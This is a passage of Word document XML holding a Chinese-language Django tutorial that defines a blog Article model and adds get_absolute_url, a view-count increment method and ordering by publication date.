    <w:p w14:paraId="12234C9F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.db import models</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67202B56" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.contrib.auth.models import User</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="136F982F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import reverse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12C01A7A" w14:textId="43160079" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.utils.timezone import now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F3B769" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E182B0E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Article(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="553D4307" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25079CD3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    STATUS_CHOICES = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="282E939B" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ('d', '</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>草稿</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FCEF00" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        ('p', '</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发表</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5499B472" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C6C8EF9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52C7E183" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    title = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标题</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=200, unique=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A637BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    slug = models.SlugField('slug', max_length=60)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74E1695C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    body = models.TextField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>正文</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713F6403" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    pub_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>发布时间</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', default=now, null=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EF1993C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    create_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>创建时间</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', auto_now_add=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22060AFB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    mod_date = models.DateTimeField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>修改时间</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', auto_now=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE23BBA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    status = models.CharField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>文章状态</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', max_length=1, choices=STATUS_CHOICES, default='p')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C46167" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    views = models.PositiveIntegerField('</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>浏览量</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', default=0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5A5930" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    author = models.ForeignKey(User, verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>作者</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', on_delete=models.CASCADE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="644CB704" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F17EEBB" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    tags = models.ManyToManyField('Tag', verbose_name='</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>标签集合</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>', blank=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70809FE4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="674E7683" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="601A9222" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        return self.title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3966CA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A2F69A0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547E7D90" w14:textId="01AC1E60" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        verbose_name = "</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>article</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13A3E551" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11A10C66" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>基础模型很多时候并不能满足我们的需求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A6572D4" w14:textId="17B63327" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F31DAF" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>django的基础模型很多时候并不能满足我们的需求。试想我们打算使用django自带的通用视图创建文章，由于通用视图在完成对象创建后需要跳转到文章的absolute_url, 这时我们需要在模型里加入自定义的get_absolute_url方法。由于我们希望统计每篇文章浏览次数，我们还需自定义一个使浏览量自增1的viewed方法，并更新数据表（详情见：</w:t>
      </w:r>
      <w:hyperlink r:id="rId259" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>django实战，之开发页面计数器。</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5986EB49" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def get_absolute_url(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA64C5D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return reverse('blog:article_detail', args=[str(self.id)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74803B80" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="656B59D3" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def viewed(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623F70F4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    self.views += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19C6A748" w14:textId="6261EFF5" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    self.save(update_fields=['views'])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750C2D6D" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>如果我们希望调用Article.objects.all()按时pub_date降序排列查询结果，我们可以在Meta里加入ordering选项即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9ACC55" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0633F39F" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    ordering = ['-pub_date']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F37983E" w14:textId="739DC24D" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    verbose_name = "article"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D88739" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07C86390" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="00995934" w:rsidRDefault="003802BB" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模型中自定义图片和文件上传路径</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6790631C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
